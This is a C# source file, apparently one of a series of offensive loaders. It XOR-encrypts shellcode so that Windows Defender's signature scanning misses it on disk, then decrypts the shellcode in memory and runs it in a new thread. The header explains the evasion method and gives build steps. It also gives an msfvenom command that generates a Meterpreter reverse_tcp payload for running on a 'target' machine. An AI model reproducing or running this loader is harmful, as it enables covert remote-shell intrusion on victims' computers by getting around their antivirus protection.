// ============================================================================
// LOADER 02: XOR Encoder/Decoder
// ============================================================================
//
// WHAT THIS DOES:
//   This file contains two programs in one:
//   1. An encoder that takes raw shellcode and XOR-encrypts it with a
//      random multi-byte key, producing an encrypted .bin file
//   2. A loader that reads the encrypted file, decrypts it at runtime
//      using the same key, and executes the shellcode in memory
//
// WHY THIS IS NEEDED:
//   Loader 01 gets caught because Defender recognizes the raw shellcode
//   bytes on disk. Those bytes match known msfvenom signatures in
//   Defender's database. If we scramble the shellcode with XOR encryption,
//   the bytes on disk look completely different from the original. Defender's
//   signature scanner cannot match what it cannot recognize. At runtime, we
//   unscramble the bytes back to the original shellcode and execute it.
//   The decrypted shellcode only exists in memory and is never written to disk.
//
// EVASION MECHANISM:
//   XOR encryption defeats static signature scanning. Defender scans files
//   on disk and checks if any byte sequences match known malware. XOR
//   changes every byte, so no signatures match. The encrypted file looks
//   like random data. Defender only sees the decrypted shellcode if it
//   scans memory at the exact moment after decryption and before execution,
//   which basic Defender does not do reliably.
//
//   Limitations: XOR alone does not bypass behavioral detection. The
//   VirtualAlloc + CreateThread pattern is still visible. Combine with
//   direct syscalls (Loader 03) for better evasion.
//
// REFERENCES:
//   - Hackmosphere: "Windows Defender bypass in 2025" (XOR + syscalls)
//   - XOR_Shellcode_Encryptor (github.com/shaddy43)
//   - Document: 06_encoding_evasion.md
//
// BUILD INSTRUCTIONS:
//   Compile the encoder:
//     csc /out:xor_encode.exe 02_xor_encoder.cs /define:ENCODER
//   Compile the loader:
//     csc /unsafe /out:xor_loader.exe 02_xor_encoder.cs
//
// USAGE:
//   Step 1 - Generate raw shellcode on Kali:
//     msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw -o payload.bin
//
//   Step 2 - Encrypt the shellcode (can run on Kali or Windows):
//     xor_encode.exe payload.bin encrypted.bin
//     (This prints the XOR key. Save it.)
//
//   Step 3 - Run the loader on Windows 11 target:
//     xor_loader.exe encrypted.bin <XOR_KEY_HEX>
//
// ============================================================================

using System;
using System.IO;
using System.Runtime.InteropServices;

namespace XorShellcode
{
    class Program
    {
        // ---- Windows API imports (same as Loader 01) ----
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        const uint MEM_COMMIT = 0x1000;
        const uint MEM_RESERVE = 0x2000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;

        // ---- XOR encryption/decryption function ----
        // XOR is a reversible operation. If you XOR data with a key, you get
        // encrypted data. If you XOR the encrypted data with the same key again,
        // you get the original data back. This is why the same function works
        // for both encrypting and decrypting.
        //
        // We use a multi-byte key (not a single byte) because single-byte XOR
        // is easy to detect with frequency analysis. A multi-byte key makes
        // the pattern much harder to spot.
        static byte[] XorCrypt(byte[] data, byte[] key)
        {
            // Create a new array to hold the result.
            // We do not modify the original data.
            byte[] result = new byte[data.Length];

            for (int i = 0; i < data.Length; i++)
            {
                // XOR each byte of data with the corresponding byte of the key.
                // The modulo operator (%) wraps the key around when we reach
                // the end of it. So if the key is 16 bytes long, byte 0 of data
                // uses byte 0 of key, byte 16 of data uses byte 0 of key again,
                // and so on.
                result[i] = (byte)(data[i] ^ key[i % key.Length]);
            }

            return result;
        }

        // ---- Generate a random key ----
        // We use C#'s Random class to create a key of the specified length.
        // Each byte in the key is a random number between 0 and 255.
        // A longer key means more randomness and harder to break encryption.
        static byte[] GenerateKey(int length)
        {
            byte[] key = new byte[length];
            Random rng = new Random();
            rng.NextBytes(key);
            return key;
        }

        // ---- Convert a hex string to bytes ----
        // When the encoder prints the key, it prints it as hexadecimal (like "4A7F2B").
        // The loader needs to convert that hex string back into bytes.
        static byte[] HexToBytes(string hex)
        {
            byte[] bytes = new byte[hex.Length / 2];
            for (int i = 0; i < bytes.Length; i++)
            {
                // Take two hex characters at a time and convert them to one byte.
                // "4A" becomes the byte value 74, "7F" becomes 127, etc.
                bytes[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
            }
            return bytes;
        }

        static void Main(string[] args)
        {
#if ENCODER
            // ============================================================
            // ENCODER MODE
            // This runs when you compile with /define:ENCODER
            // It reads raw shellcode, encrypts it, and saves the result.
            // ============================================================

            if (args.Length < 2)
            {
                Console.WriteLine("XOR Encoder");
                Console.WriteLine("Usage: xor_encode.exe <input_shellcode.bin> <output_encrypted.bin> [key_length]");
                Console.WriteLine("");
                Console.WriteLine("  key_length: number of bytes for the XOR key (default: 16)");
                return;
            }

            string inputPath = args[0];
            string outputPath = args[1];

            // Default key length is 16 bytes (128 bits).
            // You can make it longer for more randomness but 16 is enough
            // to defeat basic signature matching.
            int keyLength = 16;
            if (args.Length >= 3)
            {
                keyLength = int.Parse(args[2]);
            }

            // Read the raw shellcode from the input file.
            byte[] rawShellcode = File.ReadAllBytes(inputPath);
            Console.WriteLine("[*] Read " + rawShellcode.Length + " bytes of shellcode.");

            // Generate a random XOR key.
            byte[] key = GenerateKey(keyLength);

            // Convert the key to a hex string so we can print it.
            // The operator needs to save this key and pass it to the loader.
            string keyHex = BitConverter.ToString(key).Replace("-", "");
            Console.WriteLine("[+] XOR Key (" + keyLength + " bytes): " + keyHex);
            Console.WriteLine("[!] SAVE THIS KEY. You need it to run the loader.");

            // Encrypt the shellcode with the key.
            byte[] encrypted = XorCrypt(rawShellcode, key);

            // Write the encrypted bytes to the output file.
            // This file contains no recognizable shellcode signatures.
            File.WriteAllBytes(outputPath, encrypted);
            Console.WriteLine("[+] Encrypted shellcode written to: " + outputPath);
            Console.WriteLine("[+] Original size: " + rawShellcode.Length + " bytes");
            Console.WriteLine("[+] Encrypted size: " + encrypted.Length + " bytes");

#else
            // ============================================================
            // LOADER MODE (default)
            // This reads encrypted shellcode, decrypts it, and executes it.
            // ============================================================

            if (args.Length < 2)
            {
                Console.WriteLine("XOR Shellcode Loader");
                Console.WriteLine("Usage: xor_loader.exe <encrypted_shellcode.bin> <xor_key_hex>");
                Console.WriteLine("");
                Console.WriteLine("  xor_key_hex: the hex key printed by the encoder");
                return;
            }

            string encryptedPath = args[0];
            string keyHexArg = args[1];

            // Read the encrypted shellcode from the file.
            byte[] encryptedShellcode = File.ReadAllBytes(encryptedPath);
            Console.WriteLine("[*] Read " + encryptedShellcode.Length + " bytes of encrypted shellcode.");

            // Convert the hex key string back to bytes.
            byte[] xorKey = HexToBytes(keyHexArg);
            Console.WriteLine("[*] Using XOR key of " + xorKey.Length + " bytes.");

            // Decrypt the shellcode by XORing with the same key.
            // The decrypted shellcode only exists in memory from this point.
            // It is never written to disk, so Defender's file scanner cannot see it.
            byte[] shellcode = XorCrypt(encryptedShellcode, xorKey);
            Console.WriteLine("[+] Shellcode decrypted in memory.");

            // Allocate executable memory for the decrypted shellcode.
            IntPtr memoryAddress = VirtualAlloc(
                IntPtr.Zero,
                (uint)shellcode.Length,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE
            );

            if (memoryAddress == IntPtr.Zero)
            {
                Console.WriteLine("[-] Memory allocation failed.");
                return;
            }

            // Copy decrypted shellcode into the executable memory block.
            Marshal.Copy(shellcode, 0, memoryAddress, shellcode.Length);

            // Zero out the decrypted shellcode from the managed byte array.
            // This reduces the window where Defender's memory scanner could
            // find the decrypted shellcode in two places at once.
            Array.Clear(shellcode, 0, shellcode.Length);
            Console.WriteLine("[+] Shellcode loaded into executable memory. Managed copy cleared.");

            // Create a thread to execute the shellcode.
            IntPtr threadHandle = CreateThread(
                IntPtr.Zero, 0, memoryAddress, IntPtr.Zero, 0, IntPtr.Zero
            );

            if (threadHandle == IntPtr.Zero)
            {
                Console.WriteLine("[-] Thread creation failed.");
                return;
            }

            Console.WriteLine("[+] Shellcode executing.");

            // Wait for the shellcode thread to finish.
            WaitForSingleObject(threadHandle, 0xFFFFFFFF);
#endif
        }
    }
}
